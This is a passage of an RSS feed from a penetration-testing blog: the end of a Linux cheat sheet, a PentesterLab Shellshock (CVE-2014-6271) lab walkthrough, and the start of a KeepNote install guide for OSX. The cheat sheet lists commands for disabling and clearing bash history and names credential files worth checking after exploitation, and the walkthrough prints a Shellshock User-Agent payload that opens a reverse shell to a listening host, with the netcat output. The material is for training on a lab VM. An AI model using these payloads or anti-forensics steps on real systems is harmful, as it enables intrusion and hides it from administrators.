      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;init 6&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Reboot Linux from the command line.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gcc -o output.c input.c&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Compile C code.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gcc -m32 -o output.c input.c&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Cross compile C code, compile 32 bit binary on 64 bit Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;unset HISTORYFILE&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Disable bash history logging.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;rdesktop X.X.X.X&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Connect to RDP server from Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;kill -9 $$&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Kill current session.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;chown user:group blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Change owner of file or dir.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;chown -R user:group blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Change owner of file or dir and all underlying files / dirs - recersive chown.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;chmod 600 file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;Clear bash history:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;      &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh user@X.X.X.X | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/null &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/.bash_history
    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;linux-file-system-permissions&quot;&gt;Linux File System Permissions&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Value&lt;/th&gt;
      &lt;th&gt;Meaning&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;777&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rwxrwxrwx&lt;/code&gt; No restriction, global WRX any user can do anything.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;755&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rwxr-xr-x&lt;/code&gt; Owner has full access, others can read and execute the file.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;700&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rwx------&lt;/code&gt; Owner has full access, no one else has access.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;666&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rw-rw-rw-&lt;/code&gt; All users can read and write but not execute.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;644&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rw-r--r--&lt;/code&gt; Owner can read and write, everyone else can read.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;600&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          &lt;code&gt;rw-------&lt;/code&gt; Owner can read and write, everyone else has no access.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-file-system&quot;&gt;Linux File System&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Directory&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
    &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          / also know as &quot;slash&quot; or the root.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/bin&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Common programs, shared by the system, the system administrator and the users.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/boot&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Boot files, boot loader (grub), kernels, vmlinuz    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/dev&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Contains references to system devices, files with special properties.     

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Important system config files.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/home&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Home directories for system users.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/lib&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Library files, includes files for all kinds of programs needed by the system and the users.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/lost+found&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Files that were saved during failures are here.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/mnt&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Standard mount point for external file systems.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/media&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Mount point for external file systems (on some distros).    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/net&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Standard mount point for entire remote file systems - nfs.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/opt&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Typically contains extra and third party software.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/proc&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          A virtual file system containing information about system resources.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/root&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          root users home dir.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/sbin&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

            Programs for use by the system and the system administrator.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/tmp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

            Temporary space for use by the system, cleaned upon reboot.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

            Programs, libraries, documentation etc. for all user-related programs.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/var&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

            Storage for all variable files and temporary files created by users, such as log files, mail queue, print spooler. Web servers, Databases etc.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-interesting-files--dirs&quot;&gt;Linux Interesting Files / Dir’s&lt;/h3&gt;

&lt;p&gt;Places that are worth a look if you are attempting to privilege escalate / perform post exploitation.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Directory&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
    &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Contains local Linux users.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Contains local account password hashes.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/group&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Contains local account groups.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/init.d/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Contains service init script - worth a look to see whats installed.    

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/hostname&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          System hostname.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/network/interfaces&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Network interfaces.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          System DNS servers.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          System environment variables.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;~/.ssh/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          SSH keys.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;~/.bash_history&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Users bash history log.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/var/log/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Linux system log files are typically stored here.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/var/adm/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          UNIX system log files are typically stored here.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;/var/log/httpd/access.log&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Apache access log file typical path.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/etc/fstab&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          File system mounts.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</title>
          <link>https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/</link>
          <pubDate>Tue, 30 Sep 2014 10:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#host-enumeration&quot; id=&quot;markdown-toc-host-enumeration&quot;&gt;Host Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#website-inspection&quot; id=&quot;markdown-toc-website-inspection&quot;&gt;Website Inspection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#burp-suite---send-reverse-shellshock&quot; id=&quot;markdown-toc-burp-suite---send-reverse-shellshock&quot;&gt;Burp Suite - Send Reverse Shellshock&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;This course details the exploitation of the vulnerability &lt;strong&gt;CVE-2014-6271&lt;/strong&gt; AKA &lt;strong&gt;Shellshock&lt;/strong&gt;. This vulnerability impacts the Bourne Again Shell “Bash”. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface “CGI”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; PentesterLab&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;This is not a challenge VM&lt;/h5&gt;
  &lt;p&gt;This VM is part of the exercises provided by &lt;a href=&quot;https://pentesterlab.com&quot;&gt;PenTestersLab.com&lt;/a&gt;, it's not a challenge VM (there is no flag to capture). &lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;host-enumeration&quot;&gt;Host Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.221.144&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 6.0 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.21 ((Unix) DAV/2)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;website-inspection&quot;&gt;Website Inspection&lt;/h2&gt;

&lt;p&gt;Inspection of Squid using the metasploit module &lt;code&gt;auxiliary/scanner/http/squid_pivot_scanning&lt;/code&gt; discovered port 80 was exposed via the proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pentesterslab/shellshock/shellshock-burp.png&quot; alt=&quot;Shellshock Burp Suite&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;burp-suite---send-reverse-shellshock&quot;&gt;Burp Suite - Send Reverse Shellshock&lt;/h2&gt;

&lt;p&gt;Burp Suite was used to manipulate the &lt;code&gt;User Agent:&lt;/code&gt; and deliver the following payload:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; ignored&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.221.139/443 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pentesterslab/shellshock/shellshock-payload-burp.png&quot; alt=&quot;Burp Suite Shellshock Payload&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;

&lt;p&gt;Successfully connecting to the listening netcat instance:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc.traditional &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
192.168.221.144: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.144] 44254
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pentesterlab&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;50&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;50&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pentesterlab&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;End of exercise.&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>HowTo Install KeepNote on OSX Mavericks</title>
          <link>https://highon.coffee/blog/keepnote-macbook-install-instructions/</link>
          <pubDate>Sat, 09 Aug 2014 00:52:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>OSX</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/keepnote-macbook-install-instructions/</guid>
          <description>&lt;p&gt;&lt;strong&gt;KeepNote&lt;/strong&gt; is my favorite tool for note keeping during penetration tests, it’s advertised as cross platform and works great on Linux and Windows. But getting it to work on &lt;strong&gt;OSX&lt;/strong&gt; takes a bit of work, if you are prepared to jump through some hoops I’ve documented the installation process below.&lt;/p&gt;

&lt;p&gt;##Install Homebrew&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://brew.sh&quot;&gt;Homebrew&lt;/a&gt; is a package manager for OSX, it allows you to install applications in a similar way to BSD ports.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ruby &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-fsSL&lt;/span&gt; https://raw.github.com/Homebrew/homebrew/go/install&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After running the Brew command the following &lt;strong&gt;Apple Developer Tools&lt;/strong&gt; box will appears, click install (you no longer have to install Xcode).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/a2hVkK5.png&quot; alt=&quot;Install Apple Developer Tools OSX Mavericks&quot; title=&quot;Install Apple Developer Tools OSX Mavericks&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Output:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ruby &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-fsSL&lt;/span&gt; https://raw.github.com/Homebrew/homebrew/go/install&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; This script will &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;:
/usr/local/bin/brew
/usr/local/Library/...
/usr/local/share/man/man1/brew.1

Press RETURN to &lt;span class=&quot;k&quot;&gt;continue &lt;/span&gt;or any other key to abort
